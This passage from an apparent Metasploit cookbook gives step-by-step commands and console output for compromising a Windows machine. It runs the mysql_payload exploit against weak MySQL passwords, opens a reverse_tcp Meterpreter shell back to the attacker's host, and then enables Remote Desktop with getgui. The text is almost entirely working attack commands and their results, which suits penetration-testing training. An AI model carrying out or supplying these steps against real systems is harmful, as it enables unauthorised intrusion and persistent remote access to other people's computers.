2. Then, to enable Remote Desktop, we first need to have a Meterpreter session on the target machine. For this recipe, we can use the Oracle MySQL for Microsoft Windows Payload Execution, which takes advantage of the absence of common MySQL passwords:

```
msf > use windows/mysql/mysql_payload
msf exploit(mysql_payload) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(mysql_payload) > set PAYLOAD
windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(mysql_payload) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(mysql_payload) > exploit
```

```
...
[*] Sending stage (205379 bytes) to 192.168.216.10
[*] 192.168.216.10:3306 - Command Stager progress
- 100.00% done (12022/12022 bytes)
[*] Meterpreter session 1 opened
(192.168.216.5:4444 -> 192.168.216.10:49778)
at 2017-11-23 16:44:00 -0500

meterpreter >
```

3. Now that we have a running session, we can enable Remote Desktop using the run getgui Meterpreter script with the -e option. This will enable Remote Desktop and won't create a new user:

```
meterpreter > run getgui -e

[!] Meterpreter scripts are deprecated. Try
post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp
OPTION=value [...] 
[*] Windows Remote Desktop Configuration Meterpreter
Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*] RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] The Terminal Services service is not set to auto,
changing it to auto ...
```